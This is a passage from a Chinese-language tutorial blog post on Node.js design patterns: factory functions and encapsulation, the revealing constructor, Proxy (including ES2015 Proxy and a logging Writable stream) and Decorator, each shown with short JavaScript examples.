encapsulation(强制封装的机制)</h3><blockquote><p>封装需要做的是隐藏对象信息，外部代码只能通过暴露的公开接口修改对象而不能直接作用于对象，这又要叫做信息隐藏，和继承、多态、抽象一起都是面向对象的基本原则。</p></blockquote><p>在 <code>JavaScript</code> 中，没有权限修饰符（不能声明私有变量），所以强制封装的唯一方法是通过函数作用域和闭包。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createPerson</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> privateProperties = &#123;&#125;</span><br><span class="line">  <span class="keyword">const</span> person = &#123;</span><br><span class="line">    setName: <span class="function"><span class="params">name</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (!name) <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'A person must have a name'</span>)</span><br><span class="line">      privateProperties.name = name</span><br><span class="line">    &#125;,</span><br><span class="line">    getName: <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> privateProperties.name</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  person.setName(name)</span><br><span class="line">  <span class="keyword">return</span> person</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面代码中创建了两个对象：<code>person</code> 是通过工厂返回的公开接口；<code>privateProperties</code> 是只能通过 <code>person</code> 公开接口更改的私有属性。</p><blockquote><p>工厂只是我们创建私有成员变量的技术之一，事实上，也有很多其它的方法定义私有成员变量。在构造函数中定义私有变量；使用约定，用下划线 <code>_</code> 或美元符号 <code>$</code>（实际上并不能阻止从外部访问内部成员）的属性名称前缀；使用<code>ES2015 WeakMaps</code>。更加详细的可以看看 <code>Mozilla</code> 的 <a href="https://developer.mozilla.org/en-US/docs/Archive/Add-ons/Add-on_SDK/Guides/Contributor_s_Guide/Private_Properties" target="_blank" rel="noopener">Private Properties</a> 的文章。</p></blockquote><h3 id="Build-a-simple-code-profiler-构建一个简单的-profiler"><a href="#Build-a-simple-code-profiler-构建一个简单的-profiler" class="headerlink" title="Build a simple code profiler(构建一个简单的 profiler)"></a>Build a simple code profiler(构建一个简单的 profiler)</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profiler</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span>(label) &#123;</span><br><span class="line">    <span class="keyword">this</span>.label = label</span><br><span class="line">    <span class="keyword">this</span>.lastTime = <span class="literal">null</span></span><br><span class="line">  &#125;</span><br><span class="line">  start() &#123;</span><br><span class="line">    <span class="keyword">this</span>.lastTime = process.hrtime()</span><br><span class="line">  &#125;</span><br><span class="line">  end() &#123;</span><br><span class="line">    <span class="keyword">const</span> diff = process.hrtime(<span class="keyword">this</span>.lastTime)</span><br><span class="line">    <span class="built_in">console</span>.log(</span><br><span class="line">      <span class="string">`Timer "<span class="subst">$&#123;<span class="keyword">this</span>.label&#125;</span>" took <span class="subst">$&#123;diff[<span class="number">0</span>]&#125;</span> seconds and <span class="subst">$&#123;diff[<span class="number">1</span>]&#125;</span></span></span><br><span class="line"><span class="string">           nanoseconds.`</span></span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们使用这样一个 <code>profiler</code> 来记录每个程序的执行时间，在生产环境中就会产生大量的输出，我们想做的可能是将这些信息重定向到另一个源，或者在生产环境下完全禁用，如果直接通过 <code>new</code> 来创建 <code>Profiler</code> 对象的话需要做一些额外的逻辑以便在不同的逻辑间来切换。而使用工厂模式就可以很好地解决这个问题，根据传入参数的不同创建不同逻辑的 <code>Profiler</code> 对象：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = <span class="function"><span class="keyword">function</span>(<span class="params">label</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (process.env.NODE_ENV === <span class="string">'development'</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> Profiler(label) <span class="comment">// [1]</span></span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (process.env.NODE_ENV === <span class="string">'production'</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">      <span class="comment">// [2]</span></span><br><span class="line">      start: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;,</span><br><span class="line">      end: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'Must set NODE_ENV'</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Composable-factory-functions-可组合的工厂函数"><a href="#Composable-factory-functions-可组合的工厂函数" class="headerlink" title="Composable factory functions(可组合的工厂函数)"></a>Composable factory functions(可组合的工厂函数)</h3><p>可组合的工厂函数，它代表了一种特定类型的工厂函数，可以“组合”在一起构建新的更强大的工厂函数。</p><p>可组合工厂函数可以使用实现了 <a href="https://github.com/stampit-org/stamp-specification" target="_blank" rel="noopener">Stamp 规范</a> 的 <code>npm</code> 库 <a href="https://www.npmjs.com/package/stampit" target="_blank" rel="noopener">stampit</a>。详细的例子可直接查看官方文档 <a href="https://stampit.js.org/essentials/overview" target="_blank" rel="noopener">stampit</a>。</p><blockquote><p><code>Stamp</code> 是一个可组合的工厂函数(<code>composable factory function</code>)，根据描述符返回对象实例。它有一个 <code>compose</code> 的方法，该方法使用当前的 <code>Stamp</code> 作为一个基础，将其他的 <code>Composable</code> 组合进来，返回一个新的 <code>Stamp</code>。可以通过 <code>staticProperties</code> 属性来重写 <code>compose</code> 方法，方法在<a href="https://github.com/stampit-org/stamp-specification#overriding-compose-method" target="_blank" rel="noopener">这里</a>。</p></blockquote><h3 id="In-the-wild-实际应用"><a href="#In-the-wild-实际应用" class="headerlink" title="In the wild(实际应用)"></a>In the wild(实际应用)</h3><p>很多的 <code>Node.js</code> 的库都有使用工厂模式，利用工厂返回实例，这里就不一一举例说明了，比较有意思的可以看看 <code>Node.js</code> 的核心模块 <code>HTTP</code> (<code>http.createServer()</code>创建实例)，使用 <code>Stamp</code> 规范的包，如 <a href="https://www.npmjs.com/package/react-stampit" target="_blank" rel="noopener">react-stampit</a> 可以轻松地组合组件的功能。</p><h2 id="Revealing-constructor-揭露构造器"><a href="#Revealing-constructor-揭露构造器" class="headerlink" title="Revealing constructor(揭露构造器)"></a>Revealing constructor(揭露构造器)</h2><p>其实简单说就是将要暴露的接口返回（<code>return</code>）出去。</p><p>我们分析一下 <code>Promise</code> 的构造函数：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> promise = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p><code>Promise</code> 接收一个函数作为构造器的参数，这个函数被称为执行函数，在 <code>Promise</code> 内部被调用，它提供了一种暴露可以被外界调用的 <code>resolve</code> 和 <code>reject</code> 方法的机制去修改 <code>Promise</code> 内部的状态。这样的好处是，只有构造器才有对 <code>resolve</code> 和 <code>reject</code> 的访问权限，一旦 <code>Promise</code> 对象被创建，<code>resolve</code> 和 <code>reject</code> 就能安全地传递，在其他地方是调用不了的。</p><h3 id="A-read-only-event-emitter-一个只读的事件触发器"><a href="#A-read-only-event-emitter-一个只读的事件触发器" class="headerlink" title="A read-only event emitter(一个只读的事件触发器)"></a>A read-only event emitter(一个只读的事件触发器)</h3><p>使用这个模式我们创建一个只读的 <code>event emitter</code>:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> EventEmitter = <span class="built_in">require</span>(<span class="string">'events'</span>)</span><br><span class="line"><span class="built_in">module</span>.exports = <span class="class"><span class="keyword">class</span> <span class="title">Roee</span> <span class="keyword">extends</span> <span class="title">EventEmitter</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span>(executor) &#123;</span><br><span class="line">    <span class="keyword">super</span>()</span><br><span class="line">    <span class="keyword">const</span> emit = <span class="keyword">this</span>.emit.bind(<span class="keyword">this</span>)</span><br><span class="line">    <span class="keyword">this</span>.emit = <span class="literal">undefined</span></span><br><span class="line">    executor(emit)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以发现，现在之后通过 <code>executor</code> 传入的参数才能获取到 <code>emit</code> 的访问权限了，关键就在于 <code>this.emit = undefined</code> 这一语句使得从外面不能访问 <code>emit</code> 方法了，只能通过传入构造器的函数中的参数访问，使用方式像这样：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> Roee = <span class="built_in">require</span>(<span class="string">'./roee'</span>)</span><br><span class="line"><span class="keyword">const</span> ticker = <span class="keyword">new</span> Roee(<span class="function"><span class="params">emit</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">let</span> tickCount = <span class="number">0</span></span><br><span class="line">  setInterval(<span class="function"><span class="params">()</span> =&gt;</span> emit(<span class="string">'tick'</span>, tickCount++), <span class="number">1000</span>)</span><br><span class="line">&#125;)</span><br><span class="line"><span class="built_in">module</span>.exports = ticker</span><br></pre></td></tr></table></figure><blockquote><p>注意：上面这种方式并不是完美的，有的方法可以绕过：<code>require(&#39;events&#39;).prototype.emit.call(ticker, &#39;someEvent&#39;, {});</code>。</p></blockquote><h3 id="In-the-wild"><a href="#In-the-wild" class="headerlink" title="In the wild"></a>In the wild</h3><p>除了 <code>Promise</code> 外其实很难再找到这样的库了，现在 <code>Streams</code> 议案中有一个新的规范，可以尝试使用揭示构造函数模式替代现今的模板模式，以便能够描述各种 <code>Streams</code> 对象的行为：可以看 <a href="https://streams.spec.whatwg.org" target="_blank" rel="noopener">https://streams.spec.whatwg.org</a>。</p><h2 id="Proxy-代理模式"><a href="#Proxy-代理模式" class="headerlink" title="Proxy(代理模式)"></a>Proxy(代理模式)</h2><p><code>Proxy</code> 是用来控制访问一个被称为主题（<code>subject</code>）的对象的，这种模式也可以叫做 <code>代替模式</code>，<code>Proxy</code> 拦截对 <code>subject</code> 的操作，并对行为进行增强和补充。</p><p><img src="/assets/img/proxy.png" alt="Proxy"></p><p>上图说明 <code>Proxy</code> 和 <code>Subject</code> 是有相同的接口的，对客户端都是透明的，<code>Proxy</code> 将操作转发给 <code>Subject</code> 只不过通过额外的预处理增强其行为。</p><p>代理的应用场景：</p><ul><li>数据验证：在 <code>Proxy</code> 向 <code>Subject</code> 转发数据前验证其数据输入的合法性。</li><li>安全性：代理验证客户端是否有权限，仅仅当有权限时才会向 <code>Subject</code> 发送相关请求。</li><li>缓存：代理对象保存内部缓存，仅仅当缓存未命中时才向 <code>Subject</code> 发送相关请求。</li><li>懒加载：如果 <code>Subject</code> 的创建需要消耗大量资源，代理可以推迟创建 <code>Subject</code> 的时机。</li><li>日志：代理拦截方法和对应的参数调用，并在他们执行前后实现日志打印。</li><li>远程对象：代理可以接收远程对象，并使得其呈现为本地对象。</li></ul><h3 id="Techniques-for-implementing-proxies-实现代理的方法"><a href="#Techniques-for-implementing-proxies-实现代理的方法" class="headerlink" title="Techniques for implementing proxies(实现代理的方法)"></a>Techniques for implementing proxies(实现代理的方法)</h3><h4 id="Object-Composition-对象组合"><a href="#Object-Composition-对象组合" class="headerlink" title="Object Composition(对象组合)"></a>Object Composition(对象组合)</h4><p>创建具有与主体对象相同接口的新对象，并且对该主体的引用以实例变量或闭包变量的形式存储在代理内部。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createProxy</span>(<span class="params">subject</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> proto = <span class="built_in">Object</span>.getPrototypeOf(subject)</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">Proxy</span>(<span class="params">subject</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.subject = subject</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">Proxy</span>.prototype = <span class="built_in">Object</span>.create(proto)</span><br><span class="line">  <span class="comment">//proxied method</span></span><br><span class="line">  <span class="built_in">Proxy</span>.prototype.hello = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.subject.hello() + <span class="string">' world!'</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//delegated method</span></span><br><span class="line">  <span class="built_in">Proxy</span>.prototype.goodbye = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.subject.goodbye.apply(<span class="keyword">this</span>.subject, <span class="built_in">arguments</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Proxy</span>(subject)</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">module</span>.exports = createProxy</span><br></pre></td></tr></table></figure><p>可以发现这个 <code>Proxy</code> 对象提供了和 <code>Subject</code> 一样的接口，加强了 <code>hello()</code> 方法，直接委托了 <code>goodbye()</code> 方法。</p><p>前面的代码也显示了一个特定情况：主体对象有一个原型，我们希望维护正确的原型链，以便执行 <code>proxy instanceof Subject</code> 将返回 <code>true</code>，使用继承实现了这一点。</p><p>更多时候由于 <code>js</code> 的动态类型，我们可以简单化，使用对象字面量：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createProxy</span>(<span class="params">subject</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    <span class="comment">//proxied method</span></span><br><span class="line">    hello: <span class="function"><span class="params">()</span> =&gt;</span> subject.hello() + <span class="string">' world!'</span>,</span><br><span class="line">    <span class="comment">//delegated method</span></span><br><span class="line">    goodbye: <span class="function"><span class="params">()</span> =&gt;</span> subject.goodbye.apply(subject, <span class="built_in">arguments</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Object-augmentation-对象增强"><a href="#Object-augmentation-对象增强" class="headerlink" title="Object augmentation(对象增强)"></a>Object augmentation(对象增强)</h4><p>对象增强(或称为猴子补丁)是最为实用的实现代理的方式了，直接更改代理对象的方法：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createProxy</span>(<span class="params">subject</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> helloOrig = subject.hello</span><br><span class="line">  subject.hello = <span class="function"><span class="params">()</span> =&gt;</span> helloOrig.call(<span class="keyword">this</span>) + <span class="string">' world!'</span></span><br><span class="line">  <span class="keyword">return</span> subject</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="A-comparision-of-the-different-techniques-不同方法的比较"><a href="#A-comparision-of-the-different-techniques-不同方法的比较" class="headerlink" title="A comparision of the different techniques(不同方法的比较)"></a>A comparision of the different techniques(不同方法的比较)</h3><p>对象组合方式是比较安全的，因为不修改原对象，缺点是需要委托所有的方法，尽管可能只需要代理某一个或某几个方法，甚至有时候还需要委托属性。</p><p>对象增强就与对象组合方式相反，通常来讲，如果更改对象影响不是很大的话首选对象增强方式。</p><h3 id="Creating-a-Writable-stream"><a href="#Creating-a-Writable-stream" class="headerlink" title="Creating a Writable stream"></a>Creating a Writable stream</h3><p>实现一个代理的 <code>Writable Stream</code>，增加写入日志的功能：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createLoggingWritable</span>(<span class="params">writableOrig</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> proto = <span class="built_in">Object</span>.getPrototypeOf(writableOrig)</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">LoggingWritable</span>(<span class="params">writableOrig</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.writableOrig = writableOrig</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  LoggingWritable.prototype = <span class="built_in">Object</span>.create(proto)</span><br><span class="line"></span><br><span class="line">  LoggingWritable.prototype.write = <span class="function"><span class="keyword">function</span>(<span class="params">chunk, encoding, callback</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!callback &amp;&amp; <span class="keyword">typeof</span> encoding === <span class="string">'function'</span>) &#123;</span><br><span class="line">      callback = encoding</span><br><span class="line">      encoding = <span class="literal">undefined</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'Writing '</span>, chunk)</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.writableOrig.write(chunk, encoding, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">'Finished writing '</span>, chunk)</span><br><span class="line">      callback &amp;&amp; callback()</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  LoggingWritable.prototype.on = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.writableOrig.on.apply(<span class="keyword">this</span>.writableOrig, <span class="built_in">arguments</span>)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  LoggingWritable.prototype.end = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.writableOrig.end.apply(<span class="keyword">this</span>.writableOrig, <span class="built_in">arguments</span>)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> LoggingWritable(writableOrig)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到上面的实现方式是用对象组合的方式的，这里为了简单只委托重要的几个方法，我们覆盖了 <code>write()</code> 方法，每次调用 <code>write()</code> 时都会将消息记录到标准输出，并且每次异步操作完成时都会记录消息。</p><h3 id="Proxy-in-the-ecosystem-function-hooks-and-AOP-生态中的代理——函数钩子和-AOP"><a href="#Proxy-in-the-ecosystem-function-hooks-and-AOP-生态中的代理——函数钩子和-AOP" class="headerlink" title="Proxy in the ecosystem - function hooks and AOP(生态中的代理——函数钩子和 AOP)"></a>Proxy in the ecosystem - function hooks and AOP(生态中的代理——函数钩子和 AOP)</h3><p><code>npm</code> 中有几个库帮助开发人员使用函数钩子可以看下：<a href="https://npmjs.org/package/hooks" target="_blank" rel="noopener">hooks</a>、<a href="https://npmjs.org/package/hooker" target="_blank" rel="noopener">hooker</a>、<a href="https://npmjs.org/package/meld" target="_blank" rel="noopener">meld</a>。</p><h3 id="ES2015-Proxy"><a href="#ES2015-Proxy" class="headerlink" title="ES2015 Proxy"></a>ES2015 Proxy</h3><p><code>ES2015</code> 规范引入了一个名为 <code>Proxy</code> 的全局对象，它可以从开始在 <code>Node.js v6.0</code> 中使用。</p><p><code>Proxy API</code> 包含了一个接受 <code>target</code> 和 <code>handler</code> 的构造函数:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> proxy = <span class="keyword">new</span> <span class="built_in">Proxy</span>(target, handler)</span><br></pre></td></tr></table></figure><p><code>handler</code> 对象包含一系列具有预定义名称的可选方法，这些方法称为陷阱方法（例如，<code>apply</code>，<code>get</code>，<code>set</code> 和 <code>has</code>），这些方法在代理实例上执行相应的操作时会自动调用。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> scientist = &#123;</span><br><span class="line">  name: <span class="string">'nikola'</span>,</span><br><span class="line">  surname: <span class="string">'tesla'</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> uppercaseScientist = <span class="keyword">new</span> <span class="built_in">Proxy</span>(scientist, &#123;</span><br><span class="line">  get: <span class="function">(<span class="params">target, property</span>) =&gt;</span> target[property].toUpperCase()</span><br><span class="line">&#125;)</span><br><span class="line"><span class="built_in">console</span>.log(uppercaseScientist.name, uppercaseScientist.surname)</span><br><span class="line"><span class="comment">// prints NIKOLA TESLA</span></span><br></pre></td></tr></table></figure><p>这个例子使用 <code>Proxy API</code> 来拦截所有对 <code>scientist</code> 属性的访问，并将属性的原始值转换为大写字符串。</p><p>再看个例子：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> evenNumbers = <span class="keyword">new</span> <span class="built_in">Proxy</span>([], &#123;</span><br><span class="line">  get: <span class="function">(<span class="params">target, index</span>) =&gt;</span> index * <span class="number">2</span>,</span><br><span class="line">  has: <span class="function">(<span class="params">target, number</span>) =&gt;</span> number % <span class="number">2</span> === <span class="number">0</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="built_in">console</span>.log(<span class="number">2</span> <span class="keyword">in</span> evenNumbers) <span class="comment">// true</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="number">5</span> <span class="keyword">in</span> evenNumbers) <span class="comment">// false</span></span><br><span class="line"><span class="built_in">console</span>.log(evenNumbers[<span class="number">7</span>]) <span class="comment">// 14</span></span><br></pre></td></tr></table></figure><p>这个例子创建了一个虚拟数组，因为是不真正存储数据的，只是定义了 <code>has</code> 和 <code>get</code> 就完成了虚拟数组（包含了所有的偶数）。</p><p>更多详细的有关 <code>Proxy</code> 的用法可以查看<a href="https://developer.mozilla.org/it/docs/Web/JavaScript/Reference/Global_Objects/Proxy" target="_blank" rel="noopener">官方文档</a> 或者 <code>Google</code> 的 <a href="https://developers.google.com/web/updates/2016/02/es2015-proxies" target="_blank" rel="noopener">Introducing ES2015 Proxies</a>。</p><h3 id="In-the-wild-1"><a href="#In-the-wild-1" class="headerlink" title="In the wild"></a>In the wild</h3><p><code>Mongoose</code> 是 <code>MongoDB</code> 的一个流行的对象文档映射（<code>ODM</code>）库。 在内部，它使用 <code>hooks</code> 为 <code>init</code>，<code>validate</code>，<code>save</code> 和 <code>remove</code> 函数提供预处理和后处理的钩子函数。有关官方文档，请参阅 <a href="http://mongoosejs.com/docs/middleware.html" target="_blank" rel="noopener">Mongoose</a> 的官方文档。</p><h2 id="Decorator-装饰器"><a href="#Decorator-装饰器" class="headerlink" title="Decorator(装饰器)"></a>Decorator(装饰器)</h2><p>装饰器模式：动态增强已有的一个对象实例，而不是对整个类增强；与 <code>Proxy</code> 模式类似，但是不增强或者修改现有的接口，而是新增接口。</p><p><img src="/assets/decorator.png" alt="Decorator"></p><p>从图中可以推断出，<code>Decorator</code> 模式可以和 <code>Proxy</code> 模式组合，装饰器模式负责新增接口，代理模式负责增强或修改现有的接口(拦截对主体的访问，并做增强)。</p><h3 id="Techniques-for-implementing-Decorators-实现装饰器的方法"><a href="#Techniques-for-implementing-Decorators-实现装饰器的方法" class="headerlink" title="Techniques for implementing Decorators(实现装饰器的方法)"></a>Techniques for implementing Decorators(实现装饰器的方法)</h3><h4 id="Composition-组合"><a href="#Composition-组合" class="headerlink" title="Composition(组合)"></a>Composition(组合)</h4><p>一般使用一个新的对象包含被装饰的组件，该对象继承组件，并新增需要的方法，同时委托已有的方法给源组件。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decorate</span>(<span class="params">component</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> proto = <span class="built_in">Object</span>.getPrototypeOf(component)</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">Decorator</span>(<span class="params">component</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.component = component</span><br><span class="line">  &#125;</span><br><span class="line">  Decorator.prototype = <span class="built_in">Object</span>.create(proto)</span><br><span class="line">  <span class="comment">// new method</span></span><br><span class="line">  Decorator.prototype.greetings = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'Hi!'</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// delegated method</span></span><br><span class="line">  Decorator.prototype.hello = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.component.hello.apply(<span class="keyword">this</span>.component, <span class="built_in">arguments</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> Decorator(component)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Object-augmentation-对象增强-1"><a href="#Object-augmentation-对象增强-1" class="headerlink" title="Object augmentation(对象增强)"></a>Object augmentation(对象增强)</h4><p>对象装饰器也可以直接在源对象上添加新的方法：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decorate</span>(<span class="params">component</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// new method</span></span><br><span class="line">  component.greetings = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> component</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 